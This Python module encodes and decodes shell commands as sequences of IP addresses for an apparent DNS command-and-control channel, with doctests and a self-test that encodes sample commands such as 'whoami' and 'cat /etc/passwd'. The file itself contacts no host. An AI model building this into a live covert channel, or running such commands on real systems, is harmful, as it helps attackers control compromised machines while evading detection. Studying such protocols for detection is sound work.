#!/usr/bin/env python3
"""
DNS Protocol Functions - Pure functions for encoding/decoding DNS C2 protocol.

These functions are separated for easy testing.
"""

import base64
from typing import Tuple, List, Optional


def encode_command_to_base64(command: str) -> str:
    """
    Encode a command to base64.
    
    Args:
        command: The shell command to encode
        
    Returns:
        Base64 encoded string
        
    Example:
        >>> encode_command_to_base64("whoami")
        'd2hvYW1p'
    """
    return base64.b64encode(command.encode()).decode()


def decode_base64_to_command(encoded: str) -> str:
    """
    Decode a base64 string to a command.
    
    Args:
        encoded: Base64 encoded string
        
    Returns:
        Decoded command string
        
    Raises:
        ValueError: If base64 is invalid
        
    Example:
        >>> decode_base64_to_command("d2hvYW1p")
        'whoami'
    """
    return base64.b64decode(encoded).decode()


def split_into_chunks(data: str, chunk_size: int = 3) -> List[str]:
    """
    Split data into fixed-size chunks.
    
    Args:
        data: String to split
        chunk_size: Size of each chunk (default: 3)
        
    Returns:
        List of chunks
        
    Example:
        >>> split_into_chunks("d2hvYW1p", 3)
        ['d2h', 'vYW', '1p']
    """
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]


def encode_chunk_to_ip(chunk_data: str, is_last: bool) -> str:
    """
    Encode a chunk of base64 data into an IP address.
    
    Protocol:
    - First octet: 10 (more chunks) or 11 (last chunk)
    - Octets 2-4: ASCII values of up to 3 characters
    - Pad with 0 if less than 3 characters
    
    Args:
        chunk_data: Up to 3 characters of base64 data
        is_last: True if this is the last chunk
        
    Returns:
        IP address string (e.g., "10.100.50.104")
        
    Example:
        >>> encode_chunk_to_ip("d2h", False)
        '10.100.50.104'
        >>> encode_chunk_to_ip("1p", True)
        '11.49.112.0'
    """
    if len(chunk_data) > 3:
        raise ValueError(f"Chunk data too long: {len(chunk_data)} chars (max 3)")
    
    # First octet indicates if this is the last chunk
    first_octet = "11" if is_last else "10"
    
    # Convert characters to ASCII values
    octets = [first_octet]
    for char in chunk_data:
        octets.append(str(ord(char)))
    
    # Pad with zeros if needed
    while len(octets) < 4:
        octets.append("0")
    
    return ".".join(octets)


def decode_ip_to_chunk(ip_address: str) -> Tuple[str, bool]:
    """
    Decode an IP address back to chunk data.
    
    Args:
        ip_address: IP address string (e.g., "10.100.50.104")
        
    Returns:
        Tuple of (chunk_data, is_last)
        
    Example:
        >>> decode_ip_to_chunk("10.100.50.104")
        ('d2h', False)
        >>> decode_ip_to_chunk("11.49.112.0")
        ('1p', True)
    """
    octets = ip_address.split('.')
    
    if len(octets) != 4:
        raise ValueError(f"Invalid IP address: {ip_address}")
    
    # Check if this is the last chunk
    is_last = (octets[0] == '11')
    
    # Decode octets 1-3 back to characters
    chunk_data = ""
    for octet_str in octets[1:]:
        octet_val = int(octet_str)
        if octet_val > 0:  # Skip padding zeros
            chunk_data += chr(octet_val)
    
    return chunk_data, is_last


def encode_command_to_chunks(command: str) -> List[Tuple[str, bool]]:
    """
    Encode a complete command into IP address chunks.
    
    Args:
        command: Shell command to encode
        
    Returns:
        List of (ip_address, is_last) tuples
        
    Example:
        >>> chunks = encode_command_to_chunks("whoami")
        >>> len(chunks)
        3
        >>> chunks[0]
        ('10.100.50.104', False)
        >>> chunks[2]
        ('11.49.112.0', True)
    """
    # Encode to base64
    encoded = encode_command_to_base64(command)
    
    # Split into chunks
    chunks = split_into_chunks(encoded, 3)
    
    # Encode each chunk to IP
    result = []
    for i, chunk in enumerate(chunks):
        is_last = (i == len(chunks) - 1)
        ip = encode_chunk_to_ip(chunk, is_last)
        result.append((ip, is_last))
    
    return result


def decode_chunks_to_command(ip_addresses: List[str]) -> str:
    """
    Decode a list of IP addresses back to the original command.
    
    Args:
        ip_addresses: List of IP address strings
        
    Returns:
        Decoded command string
        
    Raises:
        ValueError: If decoding fails
        
    Example:
        >>> ips = ["10.100.50.104", "10.118.89.87", "11.49.112.0"]
        >>> decode_chunks_to_command(ips)
        'whoami'
    """
    # Decode all chunks
    chunks = []
    for ip in ip_addresses:
        chunk_data, is_last = decode_ip_to_chunk(ip)
        chunks.append(chunk_data)
        if is_last:
            break
    
    # Reconstruct base64
    encoded = "".join(chunks)
    
    # Decode to command
    return decode_base64_to_command(encoded)


def validate_chunk_sequence(ip_addresses: List[str]) -> Tuple[bool, Optional[str]]:
    """
    Validate that a sequence of IP addresses forms a valid command.
    
    Args:
        ip_addresses: List of IP address strings
        
    Returns:
        Tuple of (is_valid, error_message)
        
    Example:
        >>> validate_chunk_sequence(["10.100.50.104", "10.118.89.87", "11.49.112.0"])
        (True, None)
        >>> validate_chunk_sequence(["10.100.50.104", "0.0.0.0"])
        (False, 'Chunk 1 returned 0.0.0.0 (no data)')
    """
    if not ip_addresses:
        return False, "No IP addresses provided"
    
    found_last = False
    for i, ip in enumerate(ip_addresses):
        # Check for 0.0.0.0 (error response)
        if ip == "0.0.0.0":
            return False, f"Chunk {i} returned 0.0.0.0 (no data)"
        
        try:
            chunk_data, is_last = decode_ip_to_chunk(ip)
            
            if is_last:
                found_last = True
                break
                
        except Exception as e:
            return False, f"Chunk {i} decode error: {e}"
    
    if not found_last:
        return False, "No last chunk marker found (expected IP starting with 11.)"
    
    # Try to decode the full command
    try:
        command = decode_chunks_to_command(ip_addresses)
        return True, None
    except Exception as e:
        return False, f"Command decode error: {e}"


def get_chunk_count(command: str) -> int:
    """
    Calculate how many chunks a command will need.
    
    Args:
        command: Shell command
        
    Returns:
        Number of chunks needed
        
    Example:
        >>> get_chunk_count("whoami")
        3
        >>> get_chunk_count("ls")
        1
    """
    encoded = encode_command_to_base64(command)
    return len(split_into_chunks(encoded, 3))


if __name__ == "__main__":
    # Quick test
    import doctest
    doctest.testmod()
    
    # Manual test
    print("Testing DNS protocol functions...")
    
    test_commands = ["whoami", "ls", "pwd", "cat /etc/passwd"]
    
    for cmd in test_commands:
        print(f"\nCommand: {cmd}")
        chunks = encode_command_to_chunks(cmd)
        print(f"  Chunks: {len(chunks)}")
        for i, (ip, is_last) in enumerate(chunks):
            print(f"    {i}: {ip} {'(LAST)' if is_last else ''}")
        
        # Decode back
        ips = [ip for ip, _ in chunks]
        decoded = decode_chunks_to_command(ips)
        print(f"  Decoded: {decoded}")
        print(f"  Match: {decoded == cmd}")

